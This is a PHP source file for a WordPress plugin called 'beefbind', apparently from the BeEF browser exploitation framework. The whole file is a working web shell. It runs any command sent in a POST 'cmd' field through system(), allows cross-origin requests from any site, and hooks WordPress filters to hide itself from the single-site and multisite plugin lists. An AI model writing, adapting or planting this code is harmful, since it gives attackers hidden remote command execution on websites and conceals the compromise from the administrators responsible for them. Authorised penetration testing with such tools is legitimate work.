<?php
/**
 * Plugin Name: beefbind
 * Plugin URI: http://beefproject.com
 * Description: BeEF bind shell with CORS.
 * Version: 1.1
 * Authors: Bart Leppens, Erwan LR (@erwan_lr | WPScanTeam)
 * Author URI: https://twitter.com/bmantra
 * License: Copyright (c) 2006-2019 Wade Alcorn - wade@bindshell.net - Browser Exploitation Framework (BeEF) - http://beefproject.com - See the file 'doc/COPYING' for copying permission
**/

header("Access-Control-Allow-Origin: *");

if (isset($_POST['cmd'])) { echo @system($_POST['cmd']); }

define('BEEF_PLUGIN', 'beefbind/beefbind.php');

function hide_plugin() {
    global $wp_list_table;
    
    foreach ($wp_list_table->items as $key => $val) {
        if ($key == BEEF_PLUGIN) { unset($wp_list_table->items[$key]); }
    }
}
add_action('pre_current_active_plugins', 'hide_plugin');

// For Multisites
function hide_plugin_from_network($plugins) {
    if (in_array(BEEF_PLUGIN, array_keys($plugins))) { unset($plugins[BEEF_PLUGIN]); }

    return $plugins;
}
add_filter('all_plugins', 'hide_plugin_from_network');

?>